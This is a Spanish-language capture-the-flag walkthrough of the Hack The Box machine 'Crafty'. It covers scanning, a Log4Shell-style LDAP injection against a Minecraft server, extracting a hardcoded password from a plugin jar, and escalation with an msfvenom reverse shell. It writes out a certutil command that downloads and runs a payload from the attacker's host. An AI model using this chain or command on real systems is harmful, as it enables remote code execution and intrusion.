### Ping 
```python
ping -c 1 10.10.11.249
PING 10.10.11.249 (10.10.11.249) 56(84) bytes of data.
64 bytes from 10.10.11.249: icmp_seq=1 ttl=127 time=235 ms

--- 10.10.11.249 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 235.207/235.207/235.207/0.000 ms
```

### TTL 127= Wondows
### nmap
```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-10 22:17 EST
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 73.53% done; ETC: 22:18 (0:00:14 remaining)
Nmap scan report for 10.10.11.249
Host is up (0.097s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
10.10.11.249:25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 3/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Ports: 80/http - 25565/tcp

### Enumeración del puerto 80

agregamos el subdominio al que nos esta redirigiendo en el /etc/host

![[Pasted image 20240210232547.png]]

pagina web/ tenemos lo que parece ser un subdominio diferente llamdo play.crafty.htb

![[Pasted image 20240210233121.png]]

### Fuzzing con gobuster

![[Pasted image 20240210234241.png]]

### Tlauncher
debido a que tenemos un servidor de minecraft usaremos tlauncher para conectarnos

![[Pasted image 20240305171536.png]]

### Enumeracion del servidor 
con una pequeña busqyeda encontramos que esta version es vulnerable a una inyeccion de ldap

![[Pasted image 20240305191518.png]]

tenemos esta Poc que nos sera muy util

![[Pasted image 20240305191624.png]]
para ejecutar esto necesitamos Java JDK

### pyCraft
usaremos pycraft para hacer la inyección ldap al servidor

![[Pasted image 20240305192830.png]]

### Poc
"debemos editar el exploit para que ejecute una cmd.exe.... perfecto tenemos conexión y estamos redirigiendo el trafico al puerto 9001

![[Pasted image 20240305192930.png]]

### Redireccionamiento de puerto
estaremos a la escucha por el 9001 donde estaremos redireccionando la inyecccion ldap

![[Pasted image 20240305193720.png]]

### star.py
el script star.py no solicita el nombre de usuario para la segunda opcion nos pide dejarlo en blanco para el modo offline y nos solicita el host+port donde esta corriendo el servidor de minecraft

![[Pasted image 20240305193141.png]]

### Recibimos conexión 

![[Pasted image 20240305193218.png]]

### Escalada De privilegios
en el directorio de plugins hemos conseguido uno que parece interesante. 

![[Pasted image 20240305195827.png]]

### Transferencia de archivo
vamos a enviarnos este archivo a nuestra maquina atacante para poder analizarlo

![[Pasted image 20240305220312.png]]

![[Pasted image 20240305220343.png]]

### impacket-smbserver
usaremos impacket-smbserver para crear un servidor compartido 
![[Pasted image 20240305222529.png]]

copiamos el archivo especificando la ip y el directorio donde esta corriendo el servidor

![[Pasted image 20240305222609.png]]

### analizando el archivo
usaremos jar para extraer la informacion del archivo

![[Pasted image 20240305224247.png]]

tenemos una estructura de archivos bien organizada lo que parece ser un archivo.jar completo
### JD-GUI
usaremos jd-gui para poder leer este archivo.jar

![[Pasted image 20240305225321.png]]
tenemos lo que parece ser unas credenciales

```python
$SecPass = ConvertTo-SecureStrings 's67u84zKq8IXw' -AsPlainText -Force
```

### msfvenom
creamos un payload con msfvenom y lo moveremos a la ruta /var/www/html
![[Pasted image 20240307210028.png]]

### msfconsole
usaremos el multi/handler
![[Pasted image 20240307203956.png]]

### multi/handler
estaremos escuchando con el multi/handler para intentar conserguir una reverse shell
![[Pasted image 20240307210748.png]]

### http.server
creamos un servidor para poder compartir el archivo
![[Pasted image 20240307210833.png]]

### transferencia de archivo
subiremos el payload a la maquina victima usando el comando 
```python
	certutil -urlcache -f http://<tun0 IP>:4245/expl.exe %temp%/expl.exe
```

![[Pasted image 20240307211011.png]]

ejecutamos el payload
![[Pasted image 20240307211305.png]]

### multi/handler
recibimos conexión en el multi/handler
![[Pasted image 20240307211356.png]]

vamos a la ruta 
c:\users\svc_minecraft\server\logs aqui subiremos un nuevo payload y tambien vamos a subir el archivo RunasCs_net2.exe (https://github.com/antonioCoco/RunasCs/releases?source=post_page-----316a735a306d--------------------------------)
![[Pasted image 20240307212411.png]]
